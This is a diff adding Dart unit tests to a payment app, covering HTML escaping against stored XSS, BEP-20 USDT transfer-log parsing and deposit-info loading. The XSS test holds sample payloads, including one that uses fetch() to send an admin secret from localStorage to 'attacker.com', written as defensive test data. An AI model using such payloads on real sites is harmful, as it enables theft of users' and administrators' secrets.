@@ -193,6 +193,72 @@ void main() {
       expect((depositInfo['cryptoUsdt'] as Map)['trc20']['address'], equals('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'));
       expect((depositInfo['cryptoUsdt'] as Map)['bep20']['address'], equals('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'));
     });
+
+    test('Strict HTML entity escaping prevents Stored XSS injection', () {
+      String escapeHtml(String str) {
+        return str
+            .replaceAll('&', '&amp;')
+            .replaceAll('<', '&lt;')
+            .replaceAll('>', '&gt;')
+            .replaceAll('"', '&quot;')
+            .replaceAll("'", '&#39;');
+      }
+
+      const maliciousTrx = "'; fetch('http://attacker.com?s='+localStorage.getItem('livocal_admin_secret')); //";
+      const maliciousScript = "<script>alert('xss')</script>";
+      const maliciousImg = "<img src=x onerror=alert(1)>";
+
+      expect(escapeHtml(maliciousTrx).contains("'"), isFalse);
+      expect(escapeHtml(maliciousTrx).contains("&#39;"), isTrue);
+      expect(escapeHtml(maliciousScript).contains("<"), isFalse);
+      expect(escapeHtml(maliciousScript).contains("&lt;script&gt;"), isTrue);
+      expect(escapeHtml(maliciousImg).contains("<"), isFalse);
+      expect(escapeHtml(maliciousImg).contains("&lt;img"), isTrue);
+    });
+
+    test('BEP-20 BSC-USD transfer log recipient and 18-decimal amount parsing', () {
+      const expectedDeposit = '0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97';
+      const cleanExpected = '4838b106fce9647bdf1e7877bf73ce8b0bad5f97';
+      final paddedTopic = '0x000000000000000000000000$cleanExpected';
+
+      // Simulate Transfer event log
+      final log = {
+        'topics': [
+          '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
+          '0x0000000000000000000000009999999999999999999999999999999999999999',
+          paddedTopic,
+        ],
+        // 25 USDT with 18 decimals in hex: 25 * 10^18 = 0x15af1d78b58c40000
+        'data': '0x0000000000000000000000000000000000000000000000015af1d78b58c40000',
+      };
+
+      final logRecipient = (log['topics'] as List)[2].toString().toLowerCase();
+      final recipientMatches = logRecipient.endsWith(cleanExpected);
+      expect(recipientMatches, isTrue);
+
+      final rawVal = BigInt.parse((log['data'] as String).replaceFirst('0x', ''), radix: 16);
+      final transferredAmount = rawVal / BigInt.from(10).pow(18);
+      expect(transferredAmount.toInt(), equals(25));
+    });
+
+    test('Client deposit state prevents sending funds when depositInfo is null or loading', () {
+      Map<String, dynamic>? depositInfo; // initially null
+
+      String getDepositAccount(String method) {
+        if (depositInfo == null) return '';
+        if (method == 'bKash') return depositInfo!['bkash']?['number'] as String? ?? '';
+        return '';
+      }
+
+      // Must be empty string and not hardcoded fallback
+      expect(getDepositAccount('bKash'), equals(''));
+
+      // Once loaded from server
+      depositInfo = {
+        'bkash': {'number': '01721013902'}
+      };
+      expect(getDepositAccount('bKash'), equals('01721013902'));
+    });
   });
 }
 
